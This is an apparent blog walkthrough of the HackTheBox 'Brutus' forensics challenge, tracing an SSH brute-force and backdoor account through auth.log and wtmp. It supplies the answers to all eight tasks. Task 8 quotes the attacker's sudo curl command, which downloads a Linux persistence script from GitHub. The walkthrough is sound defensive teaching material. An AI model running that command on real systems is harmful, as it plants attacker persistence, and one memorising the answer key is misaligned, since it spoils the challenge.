@@ -1,0 +1,171 @@
+---
+title: "Sherlock - Brutus - English"
+summary: "Sherlock from HackTheBox about unauthorized login attempts on a Confluence server. The auth.log and wtmp files are provided for investigation."
+date: "Jan 01 2025"
+draft: false
+tags:
+- HackTheBox
+- Sherlock
+- Very easy
+- Tutorial
+- English
+---
+
+import SherlockBeginningTable from '/src/components/custom/SherlockBeginningTable.astro';
+import SherlockTask from '/src/components/custom/SherlockTask.astro';
+import CodeBlock from '/src/components/custom/CodeBlock.astro';
+import SherlockBodyImage from '/src/components/custom/SherlockBodyImage.astro';
+import SherlockFinalContent from '/src/components/custom/SherlockFinalContent.astro';
+import SimpleText from '/src/components/custom/SimpleText.astro';
+import { LANG_EN } from '/src/consts.ts';
+
+
+<SherlockBeginningTable  lang={LANG_EN} 
+  data={[
+    { content: `In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs.
+    We'll explore a scenario where a Confluence server was brute-forced via its SSH service. 
+    After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. 
+    Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, 
+    including aspects of privilege escalation, persistence, and even some visibility into command execution.` },
+    { content: "auth.log, wtmp" },
+  ]} />
+
+<div align="center">
+  <img width="500px" src="/public/sherlocks/brutus_images/Sherlock_logo.png" />
+</div> 
+
+## Tasks
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="1" 
+    task_content="Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?" 
+    hint_content="Searching for keywords associated with brute force attempts may help in identifying potential attacks." 
+    answer="65.2.161.68"/>
+
+- We can search for the keywords `Invalid user` to find out the attacker's IP with any of these commands:
+
+<CodeBlock code={"grep \"Invalid user\" auth.log"}/>
+
+<CodeBlock code={"cat auth.log | grep \"Invalid user\""}/>
+
+- The logs have this format:
+
+<CodeBlock code={"Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380"}/>
+
+- There are many failed login attempts from the IP 65.2.161.68 with user accounts suggesting elevated privileges (`admin`, `server_adm`, `svc_account` and `root`). That's the IP we are looking for.
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="2" 
+    task_content="The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?" 
+    hint_content="Look for keywords indicating successful login attempts to identify the compromised account." 
+    answer="root"/>
+
+- Taking a look to the `auth.log` file, we can see that access was gained with the user `root` from the IP 65.2.161.68, which is the attacker's IP as mentioned earlier.
+
+<CodeBlock code={"Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2"}/>
+
+- We can filter with the keywords `Accepted password`, though:
+
+<CodeBlock code={"cat auth.log | grep \"Accepted password\""}/>
+
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="3" 
+    task_content="Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?" 
+    hint_content="It's important to note that the first successful login by the attacker was the result of an automated brute force attempt, and the session was 
+    closed within the same second it was established. After obtaining the working credentials, the attacker manually logged in, and we need to identify that login. 
+    Use the wtmp artifact to view the login time of the working session and correlate that with auth.log." 
+    answer="2024-03-06 06:32:45"/>
+
+- Since in `auth.log` the timestamp has this format `Month Day HH:mm:SS` and the requested format is `YYYY-MM-DD HH:mm:SS`, we need to search in the `wtmp` file.
+- With this command, we can see all logins in that file:
+
+<CodeBlock code={"utmpdump wtmp"}/>
+    
+- But we can filter by the username with which the attacker gained access, which in this case is what we are interested in:
+
+<CodeBlock code={"utmpdump wtmp | grep 'root'"}/>
+
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_3.png"/>
+
+- We can see that in the last line, the login from the IP 65.2.161.68 has a similar timestamp format to `YYYY-MM-DD HH:mm:SS`. There is our answer.
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="4" 
+    task_content="SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?" 
+    hint_content="A session number is assigned immediately after the password is accepted." 
+    answer="37"/>
+
+- Considering the previous timestamp, we can search in `auth.log` around that time.
+- We search for that hour and those minutes (we could also search for the user `root`, though):
+
+<CodeBlock code={"cat auth.log | grep '06:32'"}/>
+
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_4.png"/>
+
+- We see that one second before (06:32:44), the number 37 is assigned to the `root` user's session.
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="5" 
+    task_content="The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?" 
+    hint_content="Auth.log also tracks changes related to users and groups on the server. Look for keywords indicating user additions or privilege assignments." 
+    answer="cyberjunkie"/>
+
+- Reviewing the `auth.log` file, we realize that after gaining access, the attacker creates a new user with the name `cyberjunkie`, through `useradd` command, in order to maintain persistent access to the system (creating a backdoor):
+    
+<CodeBlock code={"Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1"}/>
+     
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="6" 
+    task_content="What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?" 
+    hint_content="If you have found the answer to Question 5, consult the MITRE ATT&CK enterprise matrix to determine the sub-technique ID under the persistence tactic." 
+    answer="T1136.001"/>
+
+- To do this, we go to the URL https://attack.mitre.org and search in **Persistence > Create Account > Local Account**.
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="7" 
+    task_content="What time did the attacker's first SSH session end according to auth.log?"
+    answer="2024-03-06 06:37:24"/>
+
+- Knowing the SSH session number, we can filter by it as follows:
+    
+<CodeBlock code={"cat auth.log | grep 'session 37'"}/>
+    
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_7.png"/>
+
+- The second line indicates the time when the session was closed, with the state `Removed session 37`.
+
+---
+
+<SherlockTask lang={LANG_EN} 
+    task_number="8" 
+    task_content="The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?" 
+    hint_content="Although auth.log is not typically used to track command executions like auditd, commands executed with sudo are logged in auth.log since the system needs to authenticate the account's privileges to grant root level permissions for that command. Search for the keyword 'COMMAND' to find commands executed using sudo."
+    answer="/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"/>
+
+- The system needs to authenticate the account to grant administrative permissions for commands executed with `sudo`, which would be recorded in `auth.log`, as the hint states. We can filter by:
+    
+<CodeBlock code={"cath auth.log | grep \"COMMAND\""}/>
+ 
+<SherlockBodyImage src="/sherlocks/brutus_images/Brutus_task_8.png"/>   
+
+- One of the lines shows us the `curl` command that the attacker executed and the script URL that he downloaded.
+
+---
+
+<SherlockFinalContent lang={LANG_EN}/>
